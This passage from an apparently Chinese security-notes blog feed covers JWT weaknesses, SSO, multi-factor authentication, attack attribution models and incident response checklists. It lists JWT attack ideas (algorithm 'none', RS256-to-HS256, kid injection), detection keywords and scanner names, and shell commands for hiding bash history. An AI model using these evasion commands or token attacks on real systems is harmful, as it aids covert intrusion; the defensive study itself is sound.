&lt;p&gt;JWT 固定参数有：&lt;br /&gt;
iss：发行人&lt;br /&gt;
 exp：到期时间&lt;br /&gt;
 sub：主题&lt;br /&gt;
 aud：用户&lt;br /&gt;
 nbf：在此之前不可用&lt;br /&gt;
 iat：发布时间&lt;br /&gt;
 jti：JWT ID 用于标识该 JWT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;签名（Signature）:&lt;br /&gt;
 服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。&lt;/p&gt;
&lt;h1 id=&#34;安全问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全问题&#34;&gt;#&lt;/a&gt; 安全问题&lt;/h1&gt;
&lt;h2 id=&#34;header部分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#header部分&#34;&gt;#&lt;/a&gt; Header 部分&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是否支持修改算法为 none / 对称加密算法&lt;/li&gt;
&lt;li&gt;删除签名&lt;/li&gt;
&lt;li&gt;插入错误信息&lt;/li&gt;
&lt;li&gt;直接在 header 中加入新的公钥&lt;/li&gt;
&lt;li&gt;kid 字段是否有 SQL 注入 / 命令注入 / 目录遍历&lt;/li&gt;
&lt;li&gt;结合业务功能通过 kid 直接下载对应公私钥&lt;/li&gt;
&lt;li&gt;是否强制使用白名单上的加密算法&lt;/li&gt;
&lt;li&gt;JWKS 劫持&lt;/li&gt;
&lt;li&gt;JKU (JWK Set URL) / X5U (X.509 URL) 注入&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;payload部分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload部分&#34;&gt;#&lt;/a&gt; Payload 部分&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;其中是否存在敏感信息&lt;/li&gt;
&lt;li&gt;检查过期策略，比如  &lt;code&gt;exp&lt;/code&gt;  ,  &lt;code&gt;iat&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;signature部分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#signature部分&#34;&gt;#&lt;/a&gt; Signature 部分&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;检查是否强制检查签名&lt;/li&gt;
&lt;li&gt;密钥是否可以爆破&lt;/li&gt;
&lt;li&gt;是否可以通过其他方式拿到密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;重放&lt;/li&gt;
&lt;li&gt;通过匹配校验的时间做时间攻击&lt;/li&gt;
&lt;li&gt;修改算法 RS256 为 HS256&lt;/li&gt;
&lt;li&gt;弱密钥破解&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hdXRoMC5jb20vYmxvZy8=&#34;&gt;Critical vulnerabilities in JSON Web Token libraries&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8vI2VuY29kZWQtand0&#34;&gt;JWT CODE&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/SSO/</guid>
            <title>SSO</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/SSO/</link>
            <category>认证</category>
            <category>单点登录</category>
            <pubDate>Tue, 06 Dec 2022 10:51:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;单点登录 (SingleSignOn，SSO) 指一个用户可以通过单一的 ID 和凭证（密码）访问多个相关但彼此独立的系统。&lt;/p&gt;
&lt;h2 id=&#34;常见流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见流程&#34;&gt;#&lt;/a&gt; 常见流程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;用户 (User) 向服务提供商 (Service Provider) 发起请求&lt;/li&gt;
&lt;li&gt;SP 重定向 User 至 SSO 身份校验服务 (Identity Provider)&lt;/li&gt;
&lt;li&gt;User 通过 IP 登录&lt;/li&gt;
&lt;li&gt;IP 返回凭证给 User&lt;/li&gt;
&lt;li&gt;User 将凭证发给 SP&lt;/li&gt;
&lt;li&gt;SP 返回受保护的资源给用户&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中凭证要有以下属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;签发者的签名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;凭证的身份&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用的时间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;过期时间&lt;/li&gt;
&lt;li&gt;生效时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;可能的攻击漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可能的攻击漏洞&#34;&gt;#&lt;/a&gt; 可能的攻击 / 漏洞&lt;/h1&gt;
&lt;h2 id=&#34;信息泄漏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息泄漏&#34;&gt;#&lt;/a&gt; 信息泄漏&lt;/h2&gt;
&lt;p&gt;若 SP 和 IP 之前使用明文传输信息，可能会被窃取。&lt;/p&gt;
&lt;h2 id=&#34;伪造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪造&#34;&gt;#&lt;/a&gt; 伪造&lt;/h2&gt;
&lt;p&gt;如果在通信过程中没有对关键信息进行签名，容易被伪造。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/%E5%A4%9A%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/</guid>
            <title>多因子认证</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/%E5%A4%9A%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/</link>
            <category>认证</category>
            <pubDate>Tue, 06 Dec 2022 10:49:21 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;多因子认证是在单因子认证不足以保证安全性时使用的方法，通常会引入多种方式对用户身份进行验证。身份验证方法可以基于知识的认证，即密码；也可以基于物品的认证，例如硬件密钥；也可以是基于特征的认证，例如包含指纹在内的生物特征等。&lt;/p&gt;
&lt;p&gt;具体来说，目前常用的生物特征有：指纹、人脸、虹膜、静脉、声纹、体态等。常用的评价指标主要是速度（注册、识别使用的时间），精确度（假阳性、假阴性）等。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/</guid>
            <title>溯源分析</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/</link>
            <category>攻击溯源</category>
            <category>分析模型</category>
            <pubDate>Mon, 05 Dec 2022 16:45:22 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;攻击机溯源技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击机溯源技术&#34;&gt;#&lt;/a&gt; 攻击机溯源技术&lt;/h1&gt;
&lt;h2 id=&#34;基于日志的溯源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于日志的溯源&#34;&gt;#&lt;/a&gt; 基于日志的溯源&lt;/h2&gt;
&lt;p&gt;使用路由器、主机等设备记录网络传输的数据流中的关键信息 (时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。&lt;/p&gt;
&lt;p&gt;这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。&lt;/p&gt;
&lt;h2 id=&#34;路由输入调试技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由输入调试技术&#34;&gt;#&lt;/a&gt; 路由输入调试技术&lt;/h2&gt;
&lt;p&gt;在攻击持续发送数据，且特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在 DDoS 攻击追溯中比较有效，且网络开销较小。&lt;/p&gt;
&lt;h2 id=&#34;可控洪泛技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可控洪泛技术&#34;&gt;#&lt;/a&gt; 可控洪泛技术&lt;/h2&gt;
&lt;p&gt;追踪时向潜在的上游路由器进行洪泛攻击，如果发现收到的攻击流量变少则攻击流量会流经相应的路由。这种方式的优点在于不需要预先部署，对协同的需求比较少。但是这种方式本身是一种攻击，会对网络有所影响。&lt;/p&gt;
&lt;h2 id=&#34;基于包数据修改追溯技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于包数据修改追溯技术&#34;&gt;#&lt;/a&gt; 基于包数据修改追溯技术&lt;/h2&gt;
&lt;p&gt;这种溯源方式直接对数据包进行修改，加入编码或者标记信息，在接收端对传输路径进行重构。这种方式人力投入较少，支持事后分析，但是对某些协议的支持性不太好。&lt;/p&gt;
&lt;p&gt;基于这种方式衍生出了随机标记技术，各路由以一定概率对数据包进行标识，接收端收集到多个包后进行重构。&lt;/p&gt;
&lt;h1 id=&#34;基于蜜罐溯源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于蜜罐溯源&#34;&gt;#&lt;/a&gt; 基于蜜罐溯源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;社交网络 jsonp API&lt;/li&gt;
&lt;li&gt;获取攻击者 IP&lt;/li&gt;
&lt;li&gt;获取 burp 信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;分析模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分析模型&#34;&gt;#&lt;/a&gt; 分析模型&lt;/h1&gt;
&lt;h2 id=&#34;杀伤链kill-kain模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#杀伤链kill-kain模型&#34;&gt;#&lt;/a&gt; 杀伤链 (Kill Kain) 模型&lt;/h2&gt;
&lt;p&gt;杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪 (Reconnaissance)、武器构建 (Weaponization)、载荷投递 (Delivery)、漏洞利用 (Exploitation)、安装植入 (Installation)、通信控制 (Command&amp;amp;Control)、达成目标 (Actions on Objective) 等几个阶段。&lt;/p&gt;
&lt;p&gt;在越早的杀伤链环节阻止攻击，防护效果就越好，因此杀伤链的概念也可以用来反制攻击。&lt;/p&gt;
&lt;p&gt;在跟踪阶段，攻击者通常会采用扫描和搜索等方式来寻找可能的目标信息并评估攻击成本。在这个阶段可以通过日志分析、邮件分析等方式来发现，这阶段也可以采用威胁情报等方式来获取攻击信息。&lt;/p&gt;
&lt;p&gt;武器构建阶段攻击者通常已经准备好了攻击工具，并进行尝试性的攻击，在这个阶段 IDS 中可能有攻击记录，外网应用、邮箱等帐号可能有密码爆破的记录。有一些攻击者会使用公开攻击工具，会带有一定的已知特征。&lt;/p&gt;
&lt;p&gt;载荷投递阶段攻击者通常会采用网络漏洞、鱼叉、水坑、网络劫持、U 盘等方式投送恶意代码。此阶段已经有人员在对应的途径收到了攻击载荷，对人员进行充分的安全培训可以做到一定程度的防御。&lt;/p&gt;
&lt;p&gt;突防利用阶段攻击者会执行恶意代码来获取系统控制权限，此时木马程序已经执行，此阶段可以依靠杀毒软件、异常行为告警等方式来找到相应的攻击。&lt;/p&gt;
&lt;p&gt;安装植入阶段攻击者通常会在 web 服务器上安装 Webshell 或植入后门、rootkit 等来实现对服务器的持久化控制。可以通过对样本进行逆向工程来找到这些植入。&lt;/p&gt;
&lt;p&gt;通信控制阶段攻击者已经实现了远程通信控制，木马会通过 Web 三方网站、DNS 隧道、邮件等方式和控制服务器进行通信。此时可以通过对日志进行分析来找到木马的痕迹。&lt;/p&gt;
&lt;p&gt;达成目标阶段时，攻击者开始完成自己的目的，可能是破坏系统正常运行、窃取目标数据、敲诈勒索、横向移动等。此时受控机器中可能已经有攻击者的上传的攻击利用工具，此阶段可以使用蜜罐等方式来发现。&lt;/p&gt;
&lt;h2 id=&#34;钻石diamond模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#钻石diamond模型&#34;&gt;#&lt;/a&gt; 钻石 (Diamond) 模型&lt;/h2&gt;
&lt;p&gt;钻石模型由网络情报分析与威胁研究中心 (The Center for Cyber Intelligence Anaysis and Threat Research，CCIATR) 机构的 Sergio Catagirone 等人在 2013 年提出。&lt;/p&gt;
&lt;p&gt;该模型把所有的安全事件 (Event) 分为四个核心元素，即敌手 (Adversary)，能力 (Capability)，基础设施 (Infrastructure) 和受害者 (Victim)，以菱形连线代表它们之间的关系，因而命名为 “钻石模型”。&lt;/p&gt;
&lt;p&gt;杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。&lt;/p&gt;
&lt;p&gt;在使用钻石模型分析时，通常使用支点分析的方式。支点 (Pivoting) 指提取一个元素，并利用该元素与数据源相结合以发现相关元素的分析技术。分析中可以随时变换支点，四个核心特征以及两个扩展特征 (社会政治、技术) 都可能成为当时的分析支点。&lt;/p&gt;
&lt;h1 id=&#34;关联分析方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关联分析方法&#34;&gt;#&lt;/a&gt; 关联分析方法&lt;/h1&gt;
&lt;p&gt;关联分析用于把多个不同的攻击样本结合起来。&lt;/p&gt;
&lt;h2 id=&#34;文档类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文档类&#34;&gt;#&lt;/a&gt; 文档类&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;hash&lt;/li&gt;
&lt;li&gt;ssdeep&lt;/li&gt;
&lt;li&gt;版本信息 (公司 / 作者 / 最后修改作者 / 创建时间 / 最后修改时间)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;行为分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行为分析&#34;&gt;#&lt;/a&gt; 行为分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基于网络行为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类似的交互方式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;可执行文件相似性分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可执行文件相似性分析&#34;&gt;#&lt;/a&gt; 可执行文件相似性分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;特殊端口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;特殊字符串 / 密钥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PDB 文件路径&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;相似的文件夹&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码复用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;相似的代码片段&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;清除日志方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#清除日志方式&#34;&gt;#&lt;/a&gt; 清除日志方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;kill &amp;lt;bash process ID&amp;gt;&lt;/code&gt;  不会存储&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set +o history&lt;/code&gt;  不写入历史记录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unset HISTFILE&lt;/code&gt;  清除历史记录的环境变量&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdmxyMlg2OHRNVGdEaGREazRhb3cwZw==&#34;&gt;利用社交账号精准溯源的蜜罐技术&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</guid>
            <title>应急响应</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</link>
            <category>Windows</category>
            <category>应急响应</category>
            <category>流程</category>
            <category>Linux</category>
            <pubDate>Mon, 05 Dec 2022 16:40:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;响应流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#响应流程&#34;&gt;#&lt;/a&gt; 响应流程&lt;/h1&gt;
&lt;h2 id=&#34;事件发生&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件发生&#34;&gt;#&lt;/a&gt; 事件发生&lt;/h2&gt;
&lt;p&gt;运维监控人员、客服审核人员等发现问题，向上通报。&lt;/p&gt;
&lt;h2 id=&#34;事件确认&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件确认&#34;&gt;#&lt;/a&gt; 事件确认&lt;/h2&gt;
&lt;p&gt;收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。&lt;/p&gt;
&lt;h2 id=&#34;事件响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件响应&#34;&gt;#&lt;/a&gt; 事件响应&lt;/h2&gt;
&lt;p&gt;各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。&lt;/p&gt;
&lt;h2 id=&#34;事件关闭&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件关闭&#34;&gt;#&lt;/a&gt; 事件关闭&lt;/h2&gt;
&lt;p&gt;处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。&lt;/p&gt;
&lt;h1 id=&#34;事件分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件分类&#34;&gt;#&lt;/a&gt; 事件分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;病毒、木马、蠕虫事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Web 服务器入侵事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第三方服务入侵事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统入侵事件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用 Windows 漏洞攻击操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络攻击事件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DDoS / ARP 欺骗 / DNS 劫持等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;分析方向&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分析方向&#34;&gt;#&lt;/a&gt; 分析方向&lt;/h1&gt;
&lt;h2 id=&#34;文件分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件分析&#34;&gt;#&lt;/a&gt; 文件分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基于变化的分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;日期&lt;/li&gt;
&lt;li&gt;文件增改&lt;/li&gt;
&lt;li&gt;最近使用文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;源码分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查源码改动&lt;/li&gt;
&lt;li&gt;查杀 WebShell 等后门&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统日志分析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用日志分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分析 User-Agent，e.g.  &lt;code&gt;awvs / burpsuite / w3af / nessus / openvas&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;对每种攻击进行关键字匹配，e.g.  &lt;code&gt;select/alert/eval&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;异常请求，连续的 404 或者 500&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;md5sum&lt;/code&gt;  检查常用命令二进制文件的哈希，检查是否被植入 rootkit&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程分析&#34;&gt;#&lt;/a&gt; 进程分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;符合以下特征的进程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU 或内存资源占用长时间过高&lt;/li&gt;
&lt;li&gt;没有签名验证信息&lt;/li&gt;
&lt;li&gt;没有描述信息的进程&lt;/li&gt;
&lt;li&gt;进程的路径不合法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dump 系统内存进行分析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;正在运行的进程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;正在运行的服务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父进程和子进程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后台可执行文件的完整哈希&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;已安装的应用程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;运行着密钥或其他正在自动运行的持久化程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计划任务&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;身份信息分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#身份信息分析&#34;&gt;#&lt;/a&gt; 身份信息分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;本地以及域账号用户&lt;/li&gt;
&lt;li&gt;异常的身份验证&lt;/li&gt;
&lt;li&gt;非标准格式的用户名&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;日志分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志分析&#34;&gt;#&lt;/a&gt; 日志分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;杀软检测记录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;网络分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络分析&#34;&gt;#&lt;/a&gt; 网络分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;防火墙配置&lt;/li&gt;
&lt;li&gt;DNS 配置&lt;/li&gt;
&lt;li&gt;路由配置&lt;/li&gt;
&lt;li&gt;监听端口和相关服务&lt;/li&gt;
&lt;li&gt;最近建立的网络连接&lt;/li&gt;
&lt;li&gt;RDP / VPN / SSH 等会话&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;配置分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置分析&#34;&gt;#&lt;/a&gt; 配置分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看 Linux SE 等配置&lt;/li&gt;
&lt;li&gt;查看环境变量&lt;/li&gt;
&lt;li&gt;查看配套的注册表信息检索，SAM 文件&lt;/li&gt;
&lt;li&gt;内核模块&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;linux应急响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux应急响应&#34;&gt;#&lt;/a&gt; Linux 应急响应&lt;/h1&gt;
&lt;h2 id=&#34;文件分析-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件分析-2&#34;&gt;#&lt;/a&gt; 文件分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;最近使用文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;find / -ctime -2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Documents and Settings\Administrator\Recent&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Documents and Settings\Default User\Recent&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%UserProfile%\Recent&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统日志分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/var/log/&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;重点分析位置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;  登录进入，退出，数据交换、关机和重启纪录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/run/utmp&lt;/code&gt;  有关当前登录用户的信息记录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/lastlog&lt;/code&gt;  文件记录用户最后登录的信息，可用 lastlog 命令来查看。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/secure&lt;/code&gt;  记录登入系统存取数据的文件，例如 pop3/ssh/telnet/ftp 等都会被记录。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/cron&lt;/code&gt;  与定时任务相关的日志信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/message&lt;/code&gt;  系统启动后的信息和错误日志&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;  apache access log&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/passwd&lt;/code&gt;  用户列表&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/init.d/&lt;/code&gt;  开机启动项&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/cron*&lt;/code&gt;  定时任务&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/tmp&lt;/code&gt;  临时目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.ssh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户分析&#34;&gt;#&lt;/a&gt; 用户分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;  密码登陆相关信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uptime&lt;/code&gt;  查看用户登陆时间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/sudoers&lt;/code&gt;  sudo 用户列表&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程分析-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程分析-2&#34;&gt;#&lt;/a&gt; 进程分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;netstat -ano&lt;/code&gt;  查看是否打开了可疑端口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;w&lt;/code&gt;  命令，查看用户及其进程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分析开机自启程序 / 脚本&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/init.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.bashrc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看计划或定时任务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;crontab -l&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;netstat -an&lt;/code&gt;  /  &lt;code&gt;lsof&lt;/code&gt;  查看进程端口占用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;windows应急响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows应急响应&#34;&gt;#&lt;/a&gt; Windows 应急响应&lt;/h1&gt;
&lt;h2 id=&#34;文件分析-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件分析-3&#34;&gt;#&lt;/a&gt; 文件分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
